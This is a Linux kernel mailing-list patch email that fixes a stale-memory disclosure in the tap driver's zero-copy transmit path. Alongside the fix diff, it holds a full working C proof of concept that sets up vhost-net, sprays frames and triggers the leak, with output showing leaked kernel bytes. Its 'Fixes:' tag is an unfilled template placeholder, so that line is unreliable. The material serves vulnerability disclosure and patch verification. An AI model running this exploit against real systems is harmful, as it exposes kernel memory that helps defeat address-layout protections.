Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.178
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794588549;
	b=STgbf8L+yc1sOgr/Ehkyzm9ruKFNSOmCWuYDW91kg6W7wyyshKexnAaldi1xfPFsern2
	 de4MqiUstAPALEJDI+qlh1WfadfWMH7KdMuPtMvvuARaJ6EGvhFlPK66xJSmcQ6LuAOao
	 qQO2xvYr+Y9Xmn/iHB49vNNtq6fuHfVGzo+PTniOENNqm7STrmoCDYuNUpCdRZAOONRY/
	 bHgUt/oibZgbcZCwsCPAFTDThnYPywYS+Wp/qEFVFwVkQgOWnJ1hLdyPifccrodTsoc5D
	 4FiFIH9NudCOvHex8AkNO3wEQDgDK1sACwOmaOh81se58fAXnUIrE4v/mvqAPj6USGw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794588549;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:Content-Type:
	 Content-Transfer-Encoding;
	bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
	b=HA5YQbwqIcpHnbIdBRY+imsvhxTDQ5nNauq/H9g6MrbjAwov14rIlGcBrvJsFkAVIimb
	 6Vq61PJTjABA5nxZgKZw7CFhcSGEi1SsYHGmqtlZQvdJDjFtQ3Oi9oJgFcsUWF868/bg1
	 ee770V2bnek/hmwZLbplsjbM/xyt0QcoDS2Ylb5tAU3VlEo3kXcQvahNKVyY4mTV8DnPW
	 Cvi6DYbyA43dW0PJFxAuJbjPOjjT14vqeNQFhtEujJIsuX6Lug7FidIy8PDsQKPuRWHnN
	 H6qJY+xCcTi29Ddfc29woLNEpaORwaLLzXk5FunbRuNSDXLs+StFnD76L02A6AoFtFg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=Wyi7ihqI;
	arc=none smtp.remote-ip=209.85.215.178
Received: from mail-pg1-f178.google.com (mail-pg1-f178.google.com [209.85.215.178])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8A05B606AFE6
	for <linux-kernel@vger.kernel.org>; Fri, 13 Nov 2026 16:49:08 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8A05B606AFE6
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=Wyi7ihqI
Received: by mail-pg1-f178.google.com with SMTP id 41be03b00d2f7-cdb9f760337so1161936a12.0
        for <linux-kernel@vger.kernel.org>; Fri, 13 Nov 2026 08:49:08 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794588548; x=1795193348; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
        b=Wyi7ihqIZSwUEi54diQfmQOadzzA+cTODHpSPANcYL7cgxEgTEg/40LhonGFV4+Ym+
         7FMf4xWovj+REe3tGWtftakKkn+sNM60Xtg+glnPNFSzRdAsic5r8gt6bn1d1J9zOxcW
         HDqcc+TVHMxmMCDKgAOnpCptP1WrFMS9jh9Rd1dgjYsfyNyq1WU0FTs9h2YEQFfcjLkO
         RG7h+niLbUHrni9WmzjhubHHJVNMvLBlAwZ2rm1WwnPQ8RODhAq7lfbnO9dUXBTvrF9d
         ENqrVwMpxBs2ttZCxOtEuEE+W25BMc2fqbU0oGI1o86ql90TvP0GmuPg+p3FOj4JL6Ul
         Ia+A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794588548; x=1795193348;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
        b=N6FHBd8E32OpwKnOweKHWutFd2Wv1H5oAE6I0lj5W332np3fAtl49Jhv10bEIAarVZ
         mqMBdod4KodA/rLNlOR19qPT/8iNKkPT2WgRDviR3ARbho7TeRh+w1UvR8MPeIbaQGyu
         cXnMHZkR8PwZts9f+svk9tM37bYhFuy/QOd2W+YvEoitfl5Qfk9WJNn0JqGSx3llwz6C
         qeilhbngSZd/vL70Vc254Z0monl/Vu8ochVZoyUc1l32T3vxtOOwMRPT3Jq14B5tgU0Q
         HP0nIbJ+7Wp3Tl7tap/Mb7LPoJX4K5OJVE6GE8XpfgYLyraFm0QzLhaRJ13tvux/Wdvx
         bUAw==
X-Forwarded-Encrypted: i=1; AL+hErHFF92TMFVv8VdngTKoJACHlPiFXsM0iFE/NmiYa/0DKRdcKAWN2WGTNZtmypwTDdvHgXkAsS0Aty950xQ=@vger.kernel.org
X-Gm-Message-State: APuU4Z+N0twcWltn1aSH7eguu73jjkVizREEkMzpX7Rn9SrCcfSKC/ZW
	OHtm0VBRKSxDvatpER7OPnfLhNjPrYq8HjPbbNdGr9lDvnKLRArt3jyK
X-Gm-Gg: AYBFou0kzriFt9ammNqxBpkJIsozJ5D03ko/PKc9RghgVbhQ3/EmF8uIwJfIkmziSdJ
	Jig7coX2T6l2crPwg16Q+AQtUAzapsfidnMBwk5dbVY89qGd1YKSfEEt3tt+YZXZfnbHDDdrhkE
	mRlhPdCwBgraocv7TPRcVPxRPT5pjvrps1P3urStRg1Bt7wro/zUd8WaxfaMxTc7V8YucWsvKBW
	aPoRpTGMx6j0qS9b/d7DQCKp68D4e/vZmF5X6PjNSYeROme7q3uvz3Mra89hmS8fGYyo70iVMCU
	8eZZCSEp0a4zxS6SGs7D97MU+XnDMBlcdpyLgjlBqv6ymT5ucU9G0nBCiTsEOlnOHEQpq8b2gFD
	c4NI4oiL3/q8CqyYmA+uIjgyu+NJ/CRqHhxgCb202ShGjVXrQRGglExDoibU9aasnFjrkJMvnWF
	56alPYCMtYIWDArmVPc6wkvJgUmDg1MQ1lK933ko/8vX/DU0D+pA5+ttlMzDc29m0vRA8oPAOk6
	r0S9trnVLzBuigkEpgTkum1XYiVEkPOfIjLZP0jjLM16cPNQ/egI6Xpeegt+C6eZeRF8tZznjcM
	UJtYOHebG9MzOlPJk95HpL06fN4gehQrUHf1Yuv3ojjZfD6GzA==
X-Received: by 2002:a17:90b:584b:b0:3b1:d40:2c4e with SMTP id 98e67ed59e1d1-3b1b05b69damr1969728a91.0.1794588547741;
        Fri, 13 Nov 2026 08:49:07 -0800 (PST)
Received: from localhost.localdomain ([112.170.44.210])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b197ce49d6sm10589154a91.4.2026.11.13.08.49.04
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 13 Nov 2026 08:49:07 -0800 (PST)
From: Junyoung Jang <graypanda.inzag@gmail.com>
To: Willem de Bruijn <willemdebruijn.kernel@gmail.com>,
	Jason Wang <jasowangio@gmail.com>,
	Andrew Lunn <andrew+netdev@lunn.ch>,
	"David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@kernel.org>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>
Cc: Junyoung Jang <graypanda.inzag@gmail.com>,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH net] tap: clamp zero-copy copylen to remaining payload length
Date: Sat, 14 Nov 2026 01:49:01 +0900
Message-ID: <20261113164903.785381-1-graypanda.inzag@gmail.com>
X-Mailer: git-send-email 2.43.0
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

In tap_get_user(), q->vnet_hdr_sz is subtracted from len after
consuming the virtio header from the input iterator, and frames shorter
than ETH_HLEN are rejected. In the zero-copy TX branch, however,
copylen is computed without bounding it to the remaining frame length:

    copylen = clamp(hdr_len ?: GOODCOPY_LEN, ETH_HLEN, good_linear);

When vhost-net experimental zero-copy TX is enabled and the configured
TUNSETVNETHDRSZ header is large enough for the total descriptor to meet
vhost-net's 256-byte zero-copy threshold while leaving fewer than
GOODCOPY_LEN (128) frame bytes, a zero hdr_len sets copylen to 128.

For example, with a 260-byte descriptor consisting of a 246-byte padded
virtio header and a 14-byte Ethernet frame, tap_alloc_skb() sets the
skb linear length to 128 bytes, whereas zerocopy_sg_from_iter() copies
only the remaining 14 bytes from the iterator. dev_queue_xmit() then
transmits the extra 114 uninitialized bytes from the skb head onto the
underlying link, disclosing stale kernel memory contents in the
forwarded frame.

Clamp copylen to len so the skb linear length never exceeds the
remaining payload bytes. len is already verified to be at least
ETH_HLEN earlier in tap_get_user().

Fixes: <12자리_커밋_해시> ("<원본_커밋_제목>")
Signed-off-by: Junyoung Jang <graypanda.inzag@gmail.com>
---
Verification and reproducer notes:

Tested on Linux 7.4.0-rc2 (commit 067c5c24cef2) in an x86-64 QEMU/KVM
guest (2 vCPUs, CONFIG_MACVTAP=y, CONFIG_VHOST_NET=y, CONFIG_VETH=y)
booted with vhost_net.experimental_zcopytx=1 and init_on_alloc=0.

An October 2026 public report covered the analogous short-payload
arithmetic issue in drivers/net/tun.c:
https://lists.openwall.net/linux-kernel/2026/10/22/806

Before this patch (non-KASAN build), spraying 256 frames and submitting
a zeroed 260-byte descriptor (246-byte vnet header + 14-byte Ethernet
frame) over macvtap0 bridged onto veth0->veth1 produced a 128-byte
received frame with 50 nonzero stale bytes in the 114-byte tail:

  [POC] spray sent=256 drained=222
  [POC] trigger received_len=128 expected_user_frame=14
  [POC] trigger tail_bytes=114 tail_nonzero=50
  [POC] trigger tail_first_64=d0cd3e008188ffffd0cd3e008188ffffe8cd3e008188ffff400000000000000060ce3e008188ffff48ce3e008188ffff50ce3e008188ffff58ce3e008188ffff
  [POC] control received_len=14 expected_user_frame=14
  [POC] used_idx=2 trigger=128 control=14

Generic KASAN also delivered a 128-byte trigger frame (with zeroed tail
bytes); this is an initialized-length mismatch rather than an OOB
memory access.

With this patch applied, both trigger and control arrive as 14-byte
frames:

  [POC] trigger received_len=14 expected_user_frame=14
  [POC] control received_len=14 expected_user_frame=14
  [POC] used_idx=2 trigger=14 control=14

Disclosure: An in-house LLM-based analysis tool developed by the author
assisted in surfacing this bug candidate and drafting the initial notes.
All root-cause analysis, patch code, and QEMU/KVM reproducer results
were manually reviewed and independently verified by the author.

=== poc.c ===
// SPDX-License-Identifier: GPL-2.0
/*
 * Run inside an x86_64 VM with CONFIG_MACVTAP, CONFIG_VHOST_NET and VETH.
 * The init script should create veth0<->veth1 and macvtap0 over veth0,
 * bring them up, and pass the /dev/tapN path as argv[1].  Boot with
 * vhost_net.experimental_zcopytx=1 and init_on_alloc=0.
 *
 * This directly compares a 246-byte vnet header + 14-byte frame with a
 * normal 10-byte header + the same frame.  It captures what veth1 receives.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/if_tun.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/virtio_ring.h>
#include <linux/vhost.h>
#include <net/if.h>
#include <poll.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

#define PHYS_BASE 0x100000ULL
#define MEM_SIZE  0x10000U
#define VRING_N   8U

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static void checked_ioctl(int fd, unsigned long request, void *arg,
			  const char *name)
{
	if (ioctl(fd, request, arg))
		die(name);
}

static void make_frame(unsigned char *dst, const unsigned char dest[ETH_ALEN])
{
	const unsigned char eth[ETH_HLEN] = {
		0, 0, 0, 0, 0, 0,
		0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xee,
		0x88, 0xb5,
	};
	memcpy(dst, eth, sizeof(eth));
	memcpy(dst, dest, ETH_ALEN);
}

static int recv_frame(int sock, const char *label)
{
	unsigned char buf[2048];
	struct pollfd pfd = {.fd = sock, .events = POLLIN};
	ssize_t n;
	int tries;

	for (tries = 0; tries < 10; tries++) {
		if (poll(&pfd, 1, 2500) <= 0)
			return -1;
		n = recv(sock, buf, sizeof(buf), 0);
		if (n < ETH_HLEN || buf[12] != 0x88 || buf[13] != 0xb5)
			continue;
		printf("[POC] %s received_len=%zd expected_user_frame=14\n", label, n);
		printf("[POC] %s first_32=", label);
		for (int i = 0; i < n && i < 32; i++)
			printf("%02x", buf[i]);
		printf("\n");
		if (n > ETH_HLEN) {
			int nonzero = 0;
			for (int i = ETH_HLEN; i < n; i++)
				nonzero += buf[i] != 0;
			printf("[POC] %s tail_bytes=%zd tail_nonzero=%d\n",
			       label, n - ETH_HLEN, nonzero);
			if (nonzero) {
				printf("[POC] %s tail_first_64=", label);
				for (int i = ETH_HLEN; i < n && i < ETH_HLEN + 64; i++)
					printf("%02x", buf[i]);
				printf("\n");
			}
		}
		return (int)n;
	}
	return -1;
}

static void spray_skb_heads(int tapfd, int recvfd,
			    const unsigned char dest[ETH_ALEN])
{
	unsigned char packet[246 + 128], discard[2048];
	int sent = 0, drained = 0, flags;

	memset(packet, 0, 246);
	memset(packet + 246, 0xa5, 128);
	make_frame(packet + 246, dest);
	packet[246 + 13] = 0xb6; /* distinct EtherType from the witness */
	for (int i = 0; i < 256; i++)
		if (write(tapfd, packet, sizeof(packet)) == sizeof(packet))
			sent++;
	usleep(100000);
	flags = fcntl(recvfd, F_GETFL);
	if (flags < 0 || fcntl(recvfd, F_SETFL, flags | O_NONBLOCK))
		die("set packet socket nonblocking");
	while (recv(recvfd, discard, sizeof(discard), 0) > 0)
		drained++;
	printf("[POC] spray sent=%d drained=%d\n", sent, drained);
}

int main(int argc, char **argv)
{
	struct vhost_memory *mem;
	struct vhost_vring_state state = {.index = 1, .num = VRING_N};
	struct vhost_vring_addr addr = {.index = 1};
	struct vhost_vring_file file = {.index = 1};
	struct vring_desc *desc;
	struct vring_avail *avail;
	struct vring_used *used;
	struct sockaddr_ll sa = {0};
	struct ifreq ifr = {0};
	unsigned char *area, *packet;
	unsigned char dest[ETH_ALEN];
	uint64_t features = 0, one = 1;
	int recvfd, tapfd, vhostfd, kickfd, callfd, hdrsz, rc1, rc2;

	if (argc != 2) {
		fprintf(stderr, "usage: %s /dev/tapN\n", argv[0]);
		return 2;
	}
	setvbuf(stdout, NULL, _IONBF, 0);

	recvfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (recvfd < 0)
		die("packet socket");
	sa.sll_family = AF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("veth1");
	if (!sa.sll_ifindex)
		die("if_nametoindex veth1");
	if (bind(recvfd, (void *)&sa, sizeof(sa)))
		die("bind packet socket");
	strcpy(ifr.ifr_name, "veth1");
	if (ioctl(recvfd, SIOCGIFHWADDR, &ifr))
		die("SIOCGIFHWADDR veth1");
	memcpy(dest, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	tapfd = open(argv[1], O_RDWR | O_NONBLOCK);
	if (tapfd < 0)
		die("open macvtap");
	vhostfd = open("/dev/vhost-net", O_RDWR);
	if (vhostfd < 0)
		die("open vhost-net");
	kickfd = eventfd(0, EFD_CLOEXEC);
	callfd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
	if (kickfd < 0 || callfd < 0)
		die("eventfd");

	area = mmap(NULL, MEM_SIZE, PROT_READ | PROT_WRITE,
		    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (area == MAP_FAILED)
		die("mmap guest memory");
	desc = (void *)(area + 0x1000);
	avail = (void *)(area + 0x2000);
	used = (void *)(area + 0x3000);
	packet = area + 0x4000;

	mem = calloc(1, sizeof(*mem) + sizeof(mem->regions[0]));
	if (!mem)
		die("calloc memory table");
	mem->nregions = 1;
	mem->regions[0].guest_phys_addr = PHYS_BASE;
	mem->regions[0].memory_size = MEM_SIZE;
	mem->regions[0].userspace_addr = (uintptr_t)area;

	checked_ioctl(vhostfd, VHOST_SET_OWNER, NULL, "VHOST_SET_OWNER");
	checked_ioctl(vhostfd, VHOST_SET_MEM_TABLE, mem, "VHOST_SET_MEM_TABLE");
	checked_ioctl(vhostfd, VHOST_SET_FEATURES, &features, "VHOST_SET_FEATURES");
	checked_ioctl(vhostfd, VHOST_SET_VRING_NUM, &state, "VHOST_SET_VRING_NUM");
	state.num = 0;
	checked_ioctl(vhostfd, VHOST_SET_VRING_BASE, &state, "VHOST_SET_VRING_BASE");
	addr.desc_user_addr = (uintptr_t)desc;
	addr.avail_user_addr = (uintptr_t)avail;
	addr.used_user_addr = (uintptr_t)used;
	checked_ioctl(vhostfd, VHOST_SET_VRING_ADDR, &addr, "VHOST_SET_VRING_ADDR");
	file.fd = kickfd;
	checked_ioctl(vhostfd, VHOST_SET_VRING_KICK, &file, "VHOST_SET_VRING_KICK");
	file.fd = callfd;
	checked_ioctl(vhostfd, VHOST_SET_VRING_CALL, &file, "VHOST_SET_VRING_CALL");
	file.fd = tapfd;
	checked_ioctl(vhostfd, VHOST_NET_SET_BACKEND, &file, "VHOST_NET_SET_BACKEND");

	/* Padded header moves the guest's 14-byte frame past the zcopy gate. */
	hdrsz = 246;
	checked_ioctl(tapfd, TUNSETVNETHDRSZ, &hdrsz, "TUNSETVNETHDRSZ 246");
	spray_skb_heads(tapfd, recvfd, dest);
	memset(packet, 0, 260);
	make_frame(packet + hdrsz, dest);
	desc[0].addr = PHYS_BASE + 0x4000;
	desc[0].len = 260;
	desc[0].flags = 0;
	avail->ring[0] = 0;
	atomic_thread_fence(memory_order_release);
	avail->idx = 1;
	if (write(kickfd, &one, sizeof(one)) != sizeof(one))
		die("kick trigger");
	rc1 = recv_frame(recvfd, "trigger");

	/* Same 14-byte frame through vhost's normal copy path. */
	hdrsz = 10;
	checked_ioctl(tapfd, TUNSETVNETHDRSZ, &hdrsz, "TUNSETVNETHDRSZ 10");
	memset(packet + 0x1000, 0, 24);
	make_frame(packet + 0x1000 + hdrsz, dest);
	desc[1].addr = PHYS_BASE + 0x5000;
	desc[1].len = 24;
	desc[1].flags = 0;
	avail->ring[1] = 1;
	atomic_thread_fence(memory_order_release);
	avail->idx = 2;
	if (write(kickfd, &one, sizeof(one)) != sizeof(one))
		die("kick control");
	rc2 = recv_frame(recvfd, "control");

	printf("[POC] used_idx=%u trigger=%d control=%d\n", used->idx, rc1, rc2);
	if (getenv("EXPECT_FIXED")) {
		printf("[POC] expected=fixed\n");
		return rc1 == 14 && rc2 == 14 ? 0 : 1;
	}
	printf("[POC] expected=vulnerable\n");
	return rc1 >= 128 && rc2 >= 14 && rc2 < rc1 ? 0 : 1;
}

 drivers/net/tap.c | 2 ++
 1 file changed, 2 insertions(+)

diff --git a/drivers/net/tap.c b/drivers/net/tap.c
index 2f19fb07bb2d..b1f8776a5ca5 100644
--- a/drivers/net/tap.c
+++ b/drivers/net/tap.c
@@ -608,6 +608,8 @@ static ssize_t tap_get_user(struct tap_queue *q, void *msg_control,
 		struct iov_iter i;
 
 		copylen = clamp(hdr_len ?: GOODCOPY_LEN, ETH_HLEN, good_linear);
+		/* A padded vnet header can leave fewer payload bytes than GOODCOPY_LEN. */
+		copylen = min_t(unsigned long, copylen, len);
 		linear = copylen;
 		i = *from;
 		iov_iter_advance(&i, copylen);
-- 
2.43.0
